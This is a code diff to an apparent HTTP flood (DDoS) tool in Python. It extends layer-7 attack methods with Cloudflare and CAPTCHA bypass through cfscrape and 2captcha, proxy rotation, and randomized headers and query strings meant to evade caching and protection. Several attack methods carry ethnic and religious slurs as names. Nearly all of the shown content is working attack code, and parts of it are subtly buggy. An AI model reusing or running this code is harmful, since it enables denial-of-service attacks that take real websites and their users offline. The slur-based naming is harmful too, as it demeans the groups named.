@@ -133,8 +133,7 @@ def exit(*message):
 class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", 
-        "TANKIE_SPECIAL",
-        "CFPAPIST", "CFRAGHEAD", "CFRAGHEAD2", "CFRAGHEAD3",
+        "TANKIE_SPECIAL", "CFPAPIST", "CFRAGHEAD", "CFRAGHEAD2", "CFRAGHEAD3",
         "CF_ATTACK_RAGHEAD", "CF_ATTACK_RAGHEAD2", "CF_ATTACK_RAGHEAD3",
         "AMAMI_CANON", "AMAMI_CANON2", "AMAMI_CANON3", 
         "RAGHEAD", "PAPIST", "KACAP", "LOIC", "LOIC_CF",
@@ -701,6 +700,7 @@ class HttpFlood(Thread):
     _acceptlang: List[str]
     _fetchmode: List[str]
     _fetchsite: List[str]
+    _fetchdust: List[str]
     _cache_control: List[str]
     _target: URL
     _method: str
@@ -1033,6 +1033,16 @@ class HttpFlood(Thread):
             ]
         self._cache_control = list(cache_control)
 
+        fetch_site: List[str] = [
+                "cross-site",
+                "same-origin",
+                "same-site",
+                "none",
+            ]
+        self._fetchsite = list(fetch_site)
+        
+
+
 
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
@@ -1130,6 +1140,25 @@ class HttpFlood(Thread):
         "Sec-Fetch-Mode" : randchoice(self._fetchmode),
         "Sec-Fetch-Site": "same-origin",
         "Sec-Fetch-Dest": "document"}
+
+    def get_headersx_GSB(self) -> dict:
+        
+        randhex = str(randbytes(randchoice([32, 64, 128])))
+
+        return {"Host" : str(self._host),
+        "Connection" : "keep-alive",
+        "Cache-Control" : randchoice(self._cache_control),
+        "Upgrade-Insecure-Requests" : "1",
+        "User-Agent" : randchoice(self._useragents),
+        "Accept" : randchoice(self._acceptall),
+        "Accept-Encoding" : randchoice(self._acceptencode),
+        "Accept-Language" : randchoice(self._acceptlang),
+        "Sec-Fetch-Mode" : randchoice(self._fetchmode),
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Gpc": 1,
+        "Pragma": "no-cache",
+        "Referrer": randchoice(self._referers) + parse.quote(self._target.human_repr())}
 
 
     def POST(self) -> None:
@@ -1316,7 +1345,7 @@ class HttpFlood(Thread):
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
-                sleep(random.randint(1,10))
+                sleep(random.randint(1,2))
             finally:
                 Tools.safe_close(s)
 
@@ -1401,10 +1430,10 @@ class HttpFlood(Thread):
             try:
                 for _ in range(self._rpc):
                     if pro:
-                        with s.get(str(self._target), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), headers=headersx, proxies=pro.asRequest(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)),
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000), headers=headersx, proxies=pro.asRequest(), timeout=60),
                                    proxies=pro.asRequest(), headers=headersx, timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
@@ -1418,17 +1447,34 @@ class HttpFlood(Thread):
         
         headersx = self.get_headersx()
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter='nodejs', delay=int(random.randint(10,15)), captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
             try:
                 for _ in range(self._rpc):
-                    with s.get(str(self._target), headers=headersx, timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        BYTES_SEND += Tools.sizeOfRequest(res)
+                    sleep(max(self._rpc / 1000, 1))
+                    attack_method = int(random.randint(0,3))
+                    if self._rpc % attack_method == 0:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,20000)), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                    elif self._rpc % attack_method == 1:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(1,20))), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                    elif self._rpc % attack_method == 2:
+                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(1,20))) + str(random.randint(0,200000)), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                    elif self._rpc % attack_method == 3:
+                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(1,20))), timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                    elif self._rpc % attack_method == 4:
+                        with s.get(str(self._target), headers=headersx, timeout=60) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
             except:
                 sleep(random.randint(1,3))
             finally:
@@ -1436,8 +1482,6 @@ class HttpFlood(Thread):
 
     def CFRAGHEAD2(self):
         global REQUESTS_SENT, BYTES_SEND
-
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         pro = None
         if self._proxies:
@@ -1469,28 +1513,31 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
 
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
             try:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
                     attack_method = int(random.randint(0,3))
                     if self._rpc % attack_method == 0:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target), params=str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
                     elif self._rpc % attack_method == 1:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target), params=Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
                     elif self._rpc % attack_method == 2:
-                        with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target), params=str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
                     elif self._rpc % attack_method == 3:
-                        with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
+                        with s.get(str(self._target), params=Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
                             REQUESTS_SENT += 1
                             BYTES_SEND += Tools.sizeOfRequest(res)
                             continue
@@ -1553,7 +1600,10 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
             try:
                 sleep(5.01)
                 ts = time()
@@ -1578,7 +1628,10 @@ class HttpFlood(Thread):
 
         headersx = self.get_headersx()
 
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
             try:
                 sleep(5.01)
                 ts = time()
@@ -1623,7 +1676,10 @@ class HttpFlood(Thread):
         #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
 
         # Attacking
-        with suppress(Exception), create_scraper() as s:
+        with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
             try:
                for _ in range(self._rpc):
                     if pro:
@@ -1800,30 +1856,28 @@ class HttpFlood(Thread):
         if self._proxies:
             pro = randchoice(self._proxies)
 
-        headersx = self.get_headersx()
-
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-
-        scraper = None
-
         # Attacking
         try:
+            scraper = None
             bypass_method = int(random.randint(0,2))
             if bypass_method == 0:
-                scraper = cfscrape.create_scraper()
+                scraper = cfscrape.create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } )
             else:
                 scraper = Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest())
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
                 attack_method = int(random.randint(0,3))
                 if self._rpc % attack_method == 0:
-                     scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)
+                     scraper.get(url, headers=self.get_headersx(), proxies=pro.asRequest(), timeout=60)
                 elif self._rpc % attack_method == 1:
-                     scraper.get(url+ "/?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), headers=headersx, timeout=60)
+                     scraper.get(url+ "/?=" + str(random.randint(0,20000)), proxies=pro.asRequest(), headers=self.get_headersx(), timeout=60)
                 elif self._rpc % attack_method == 2:
-                     scraper.get(url+ "/?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), headers=headersx, timeout=60)
+                     scraper.get(url+ "/?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), headers=self.get_headersx(), timeout=60)
                 else:
-                     scraper.get(url, headers=headersx, proxies=pro.asRequest(), timeout=60)  
+                     scraper.get(url, headers=self.get_headersx(), proxies=pro.asRequest(), timeout=60)  
         except:
             sleep(random.randint(1,10))
         finally:
@@ -1841,7 +1895,10 @@ class HttpFlood(Thread):
             bypass_method = int(random.randint(0,1))
             if bypass_method == 0:
                 #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
-                with suppress(Exception), create_scraper() as s:
+                with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
                      for _ in range(self._rpc):
                          sleep(max(self._rpc / 1000, 1))
                          attack_method = int(random.randint(0,3))
@@ -1867,22 +1924,22 @@ class HttpFlood(Thread):
                          sleep(min(self._rpc, 5) / 100)
                          attack_method = int(random.randint(0,3))
                          if self._rpc % attack_method == 0:
-                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
+                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), timeout=60) as res:
                                  REQUESTS_SENT += 1
                                  BYTES_SEND += Tools.sizeOfRequest(res)
                                  continue
                          elif self._rpc % attack_method == 1:
-                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
+                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
                                  REQUESTS_SENT += 1
                                  BYTES_SEND += Tools.sizeOfRequest(res)
                                  continue
                          elif self._rpc % attack_method == 2:
-                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), proxies=pro.asRequest(), timeout=60) as res:
+                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), timeout=60) as res:
                                  REQUESTS_SENT += 1
                                  BYTES_SEND += Tools.sizeOfRequest(res)
                                  continue
                          elif self._rpc % attack_method == 3:
-                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), proxies=pro.asRequest(), timeout=60) as res:
+                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), timeout=60) as res:
                                  REQUESTS_SENT += 1
                                  BYTES_SEND += Tools.sizeOfRequest(res)
                                  continue
@@ -1893,82 +1950,65 @@ class HttpFlood(Thread):
 
     def AMAMI_CANON3(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
-      
-        proxy = pro.ip_port().split(":")
 
-        req =  "GET / HTTP/1.1\r\nHost: " + str(self._host) + "\r\n"
-        req += "User-Agent: " + randchoice(self._useragents) + "\r\n"
-        #req += "Accept: text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
-        req += "Sec-Fetch-Site: same-origin\r\n"
-        req += "Sec-GPC: 1\r\n"
-        req += "Sec-Fetch-Mode: navigate\r\n"
-        req += "Sec-Fetch-Dest: document\r\n"
-        req += "Upgrade-Insecure-Requests: 1\r\n"
-        req += "Connection: Keep-Alive\r\n\r\n"
+        s = None
 
-        attack_header = int(random.randint(0,5))
-
-        if attack_header == 0:
-            req += "Cache-Control: max-age=0\r\n"
-        elif attack_header == 1:
-            req += "Cache-Control: no-cache\r\n"
-        elif attack_header == 2:
-            req += "Cache-Control: no-store\r\n"
-        elif attack_header == 3:
-            req += "Cache-Control: private\r\n"
-        elif attack_header == 4:          
-            req += "Cache-Control: no-transform\r\n"
-        elif attack_header == 5:
-            req += "Cache-Control: only-if-cached\r\n"
-        else:
-            req += "Cache-Control: no-cache\r\n"
-
-        attack_header = int(random.randint(0,10))
-
-        if attack_header == 0:
-            req += "Sec-Fetch-Dest: audio\r\n"
-        elif attack_header == 1:
-            req += "Sec-Fetch-Dest: audioworklet\r\n"
-        elif attack_header == 2:
-            req += "Sec-Fetch-Dest: document\r\n"
-        elif attack_header == 3:
-            req += "Sec-Fetch-Dest: empty\r\n"
-        elif attack_header == 4:          
-            req += "Sec-Fetch-Dest: frame\r\n"
-        elif attack_header == 5:
-            req += "Sec-Fetch-Dest: image\r\n"
-        elif attack_header == 6:
-            req += "Sec-Fetch-Dest: object\r\n"
-        elif attack_header == 7:
-            req += "Sec-Fetch-Dest: report\r\n"
-        else:
-            req += "Sec-Fetch-Dest: document\r\n"
-
-        for _ in range(self._rpc):
-            try:
-                with socks.socksocket() as s:
-                    s = socks.socksocket()
-                    s.connect((str(self._host), int(443)))
-                    s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    s = ctx.wrap_socket(s, server_hostname=self._target)
-                    s.send(str.encode(req))
-                    try:
-                        for _ in range(100):
-                            s.send(str.encode(req))
-                            s.send(str.encode(req))
-                    except:
-                        sleep(random.randint(1,2))
-                    finally:
-                        pass
-            except:
-                pass
-            finally:
-                Tools.safe_close(s)
+        try:
+            bypass_method = int(random.randint(0,1))
+            if bypass_method == 0:
+                #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
+                with suppress(Exception), create_scraper(interpreter='nodejs', delay=10, captcha={
+		                            'provider': '2captcha', 
+		                            'api_key': 'you_2captcha_api_key', 
+	                                } ) as s:
+                     for _ in range(self._rpc):
+                         sleep(max(self._rpc / 1000, 1))
+                         attack_method = int(random.randint(0,3))
+                         if self._rpc % attack_method == 0:
+                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                         elif self._rpc % attack_method == 1:
+                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                         elif self._rpc % attack_method == 2:
+                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                         elif self._rpc % attack_method == 3:
+                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+            else:
+                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as s:
+                     for _ in range(self._rpc):
+                         sleep(min(self._rpc, 5) / 100)
+                         attack_method = int(random.randint(0,3))
+                         if self._rpc % attack_method == 0:
+                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                                 continue
+                         elif self._rpc % attack_method == 1:
+                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                                 continue
+                         elif self._rpc % attack_method == 2:
+                             with s.get(str(self._target) + "?=" + str(random.randint(0,200000)) + Tools.randomname(int(random.randint(5,10))), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                                 continue
+                         elif self._rpc % attack_method == 3:
+                             with s.get(str(self._target) + "?=" + Tools.randomname(int(random.randint(5,10))) + str(random.randint(0,200000)), headers=self.get_headersx(), timeout=60) as res:
+                                 REQUESTS_SENT += 1
+                                 BYTES_SEND += Tools.sizeOfRequest(res)
+                                 continue
+        except:
+            sleep(random.randint(1,10))
+        finally:
+            Tools.safe_close(s)
 
 
     def DGB(self):
@@ -2738,7 +2778,7 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 # get the up-to-date proxies
-                DownloadProxies(proxy_ty, proxy_li)
+                #DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
